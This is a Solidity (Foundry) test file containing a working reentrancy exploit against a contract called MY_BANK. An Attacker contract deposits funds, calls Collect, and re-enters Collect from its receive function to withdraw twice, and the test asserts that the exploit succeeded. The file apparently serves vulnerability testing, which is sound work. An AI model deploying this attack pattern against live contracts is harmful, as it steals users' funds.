
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MY_BANK, Log} from "../src/MY_BANK.sol";

contract TestReentrancyMY_BANK is Test {
    MY_BANK public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new MY_BANK(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal >= 1 ether && attackVal < type(uint128).max);

        // --- 2. State Configuration (Pre-Condition) ---
        // The Collect function requires:
        // - acc.balance >= MinSum (1 ether)
        // - acc.balance >= _am
        // - block.timestamp > acc.unlockTime

        // --- 3. Funding ---
        // Fund the victim contract so it has ETH to steal
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // Fund the attacker
        vm.deal(address(_attacker), attackVal * 2);

        // Fund the test contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        // Setup: Attacker deposits funds to create a balance in the contract
        _attacker.setupAttack{value: attackVal}(attackVal);
        
        // Warp time to ensure unlockTime has passed
        vm.warp(block.timestamp + 1);
        
        // Execute the attack
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    MY_BANK public _victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        _victim = MY_BANK(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        // Deposit funds into the victim contract using Put function
        // Set unlockTime to 0 so it will be set to block.timestamp
        _victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        // Capture initial balance before the attack
        initialSnapshot = address(this).balance;

        // Store the value for the re-entrant call
        storedAttackVal = val;

        // Call the vulnerable Collect function
        _victim.Collect(val);

        // Verify success: if we called Collect more than once via reentrancy
        // and our balance increased more than expected
        if (attackCallCount > 1) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        attackCallCount++;
        
        // Re-enter if we haven't done so yet and victim still has funds
        if (attackCallCount < 2 && address(_victim).balance >= storedAttackVal) {
            _victim.Collect(storedAttackVal);
        }
    }
}
